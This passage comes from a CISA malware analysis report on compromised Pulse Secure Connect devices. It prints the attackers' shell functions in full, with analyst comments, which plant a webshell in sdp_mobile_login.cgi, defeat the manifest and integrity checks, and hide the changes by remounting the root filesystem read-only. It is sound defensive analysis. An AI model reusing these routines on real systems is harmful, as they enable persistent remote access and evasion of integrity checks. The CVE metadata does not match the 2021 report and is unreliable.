Function--\n\n\t\t\tpatch_manifest()\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0file=\"/tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi\u201d //*CISA: Assign full path to variable file\n\t\t\t\u00a0\u00a0\u00a0OPENSSL=\"/tmp/data/root/home/bin/openssl\".\n\t\t\t\u00a0\u00a0\u00a0h=`$OPENSSL dgst -sha256 $file 2>/dev/null | sed -e 's/^[^ ]*= //\u2018` //*CISA: SHA256 hash file.\n\t\t\t\u00a0\u00a0\u00a0bkh=\"/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi \"$h\" b\" \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 //*CISA: Build variable containing full file name and SHA256.\n\t\t\t\u00a0\u00a0\u00a0ori=`sed -n \"/sdp_mobile_login.cgi/=\" /tmp/data/root/home/etc/manifest/manifest` //*CISA: Count number of sdp_mobile_login.cgi occurrences.\n\t\t\t\u00a0\u00a0\u00a0if [ -n \"$ori\" ]; then \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 /bin/sed -i \"$ori\"a\\\\\"$bkh\" /tmp/data/root/home/etc/manifest/manifest //*CISA: Replace with full path of hacked sdp_mobile_login.cgi file with hash value.\n\t\t\t\u00a0\u00a0\u00a0 /bin/sed -i \"$ori\"d /tmp/data/root/home/etc/manifest/manifest\n\t\t\t\u00a0\u00a0\u00a0fi\n\t\t\t\u00a0\u00a0\u00a0sed -i '/verify 1/d' /tmp/data/root/home/bin/check_integrity.sh //*CISA: Remove \"verify 1\" string from file.\n\t\t\t\u00a0\u00a0\u00a0sed -i '/err Signature/d' /tmp/data/root/home/bin/check_integrity.sh //*CISA: Remove \"err Signature\" string from file.\n\t\t\t}\n\n\t\t\t--End manifest and check_integrity.sh Modification Function--\n\n\t\t\tThe script modifies the Pulse Secure system file named sdp_mobile_login.cgi by adding data to it from a file contained on disk named tmp2. The code utilized to modify sdb_mobile_login.cgi is illustrated below. Analysis of the modified sdb_mobile_login.cgi indicates this modification adds a webshell to the Pulse Secure applications which allows an operator to remotely issue commands to a compromised device. This patched in webshell is detailed within the description of the file sdp_mobile_login.cgi, included within this document. Notably, the function below also modifies the /bin/umount application by adding data to it contained in the files tmp1 and tmp2. After the modifications of umount and sdp_mobile_login.cgi, the function deletes the files tmp1 and tmp2. The original files tmp1 and tmp2 were not available for analysis.\n\n\t\t\t--Begin sdb_mobile_login.cgi and umount Modification Code (Using tmp1 and tmp2)--\n\n\t\t\tpatch_cgi()\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#cgistart1/,/\\#\\#cgiend1/w tmp1' /bin/umount\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#cgistart2/,/\\#\\#cgiend2/w tmp2' /bin/umount\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/^use DSSessionParams/r tmp1' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/^sub main/r tmp2' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#cgistart1/,/\\#\\#cgiend1/s/#//' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#cgistart2/,/\\#\\#cgiend2/s/#//' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#cgi/d' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi\n\t\t\t\u00a0\u00a0\u00a0/bin/rm -f tmp1\n\t\t\t\u00a0\u00a0\u00a0/bin/rm -f tmp2\n\t\t\t}\n\n\t\t\t--End sdb_mobile_login.cgi and umount Modification Code (Using tmp1 and tmp2)--\n\n\t\t\tThe malicious function illustrated below is designed to extract the ELF binary from the current (hacker modified) umount application, and run it as a standalone application to actually perform the umount function for the operating system. The function extracts the embedded ELF, writes it out to disk as /bin/umount_re, and sets it to executable via the system command /bin/chmod u+x /bin/umount_re. The function then executes the umount_re application and deletes it from disk. The final command in the function mounts /dev/root as read only. The remounting of /dev/root with read only permissions is likely a method to hide this activity from a system administrator, as it may draw the attention of system analysts that /dev/root is mounted with read and write permissions.\n\n\t\t\t--Begin normal_um() Function--\n\n\t\t\tnormal_um()\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0/bin/cp /bin/umount /bin/umount_re\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#sstart/,/\\#\\#eend/d' /bin/umount_re\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '1d' /bin/umount_re\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i 's/^#//' /bin/umount_re\n\t\t\t\u00a0\u00a0\u00a0/bin/chmod u+x /bin/umount_re\n\t\t\t\u00a0\u00a0\u00a0/bin/umount_re $*\n\t\t\t\u00a0\u00a0\u00a0/bin/rm -f /bin/umount_re\n\t\t\t\u00a0\u00a0\u00a0/bin/mount -o remount,ro /dev/root / >/dev/null 2>&1\n\t\t\t}\n\n\t\t\t--End normal_um() Function--\n\n\t\t\tThe function below modifies the system application /bin/umount using the data contained in a file named /tmp/data/root/bin/xx. The function then deletes the file named /tmp/data/root/bin/xx.\n\n\t\t\t--Begin patch_umount Function--\n\n\t\t\tpatch_umount()\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#sstart/,/\\#\\#eend/w /tmp/data/root/bin/xx' /bin/umount\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i 's/^/#/' /tmp/data/root/bin/umount\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '1i \\ ' /tmp/data/root/bin/umount\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '1r /tmp/data/root/bin/xx' /tmp/data/root/bin/umount\n\t\t\t\u00a0\u00a0\u00a0/bin/touch /tmp/data/root/bin/umount -r /tmp/data/root/bin/cp\n\t\t\t\u00a0\u00a0\u00a0/bin/rm -f /tmp/data/root/bin/xx\n\t\t\t}\n\n\t\t\t--End patch_umount Function--\n\n\t\t\tIllustrated below, is the \"main\" portion of this malicious application with comments added by our team to illustrate the purpose of this file.\n\n\t\t\tNote: The comments in the code below were added by CISA to clarify the functionality of different parts of the malicious code.\n\n\t\t\t--Begin Main Script--\n\n\t\t\t/bin/mount -o remount,rw /dev/root / >/dev/null 2>&1 //*CISA: Mount the /dev/root partition with read and write permissions.\n\t\t\tif [ $# == 2 ] && [ $1 == \"-r\" ] && [ $2 == \"/tmp/data/root\" ] ; then\n\t\t\t\u00a0\u00a0\u00a0patch_cgi //*CISA: Patch the applications /bin/umount and sdp_mobile_login.cgi with malicious code (allowing remote access to device).\n\t\t\t\u00a0\u00a0\u00a0patch_manifest //*CISA: Patch manifest and check_integrity.sh scripts so they will not block the now patched app sdp_mobile_login.cgi.\n\t\t\t\u00a0\u00a0\u00a0patch_umount. //*CISA: Patches the /bin/umount file with data from /tmp/data/root/bin/xx.\n\t\t\t\u00a0\u00a0\u00a0patch_libdsp //*CISA: Patches Pulse Secure system library /tmp/data/root/home/lib/libdsplibs.so.\n\t\t\t\u00a0\u00a0\u00a0normal_um $* //*CISA: Extracts ELF from patched umount application, executes it, deletes it. Then remounts /dev/root as read only.\n\t\t\telse\n\t\t\t\u00a0\u00a0\u00a0normal_um $*\n\t\t\tfi\n\n\t\t\t--End Main Script--\n\n\nea1574595f87171c26f483df77dec52b0c5c73dd37f4dd554944cd6a8b484d17\nDetails\n\n\n\nName\nlicenseserverproto.cgi\n\n\nSize\n1967 bytes\n\n\nType\nPerl script text executable\n\n\nMD5\ne65007255aedda92fdfc7da83463996c\n\n\nSHA1\nc8fd93457ab43ac6530d2a964eafe3ad918f864c\n\n\nSHA256\nea1574595f87171c26f483df77dec52b0c5c73dd37f4dd554944cd6a8b484d17\n\n\nSHA512\ncb5c98ce12967f367f3fa8a820d72c85ebf183cd9aca77d8ff00d1dd847e50fdcfd1a1d819cb07ca9374f8f455838b20f0592a47789345b458270fd5ccc7358f\n\n\nssdeep\n48:E1LYmeAJAZo1BuswT4o7oo7vpBBBQWBZ7zSH72BZ7TtH7CN4/to7jH7XH76bejBM:EJYkJAZfv/wO27YJ\n\n\nEntropy\n5.078353\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nUpon execution, this Perl script creates a table with two columns (msg_body, msg_length) and the first record for this table. The first record's msg_body is the standard input streams and msn_length is the standard input streams' length.\n\nRecommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\nContact Information\n\n\n1-888-282-0870\nCISA Central\u00a0(UNCLASS)\nCISA SIPR (SIPRNET)\nCISA IC (JWICS)\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at the following URL: https://us-cert.cisa.gov/forms/feedback/\n\nDocument FAQ\n\nWhat is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In most instances this report will provide initial indicators for computer and network defense. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nWhat is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nCan I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document should be directed to the CISA at 1-888-282-0870 or CISA Central.\nCan I submit malware to CISA? Malware samples can be submitted via three methods:\n\nWeb: https://malware.us-cert.gov\nE-Mail: submit@malware.us-cert.gov\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on CISA's homepage at www.cisa.gov.\n\n\n\n\n\n\n\n\nRevisions\n\nInitial Version: August 24, 2021\n",
  "cves": [
    "CVE-2022-47966",
    "CVE-2022-42475"
  ],
  "techniques": [],
  "advisory": "ar21-236e",
  "title": "MAR-10339606-1.v1: Pulse Secure Connect | CISA",
  "source": "analysis-reports",
  "id": "21107dc987c8c029e333037606506c2a5f36c025a8ab694238ecfca43fade974"
}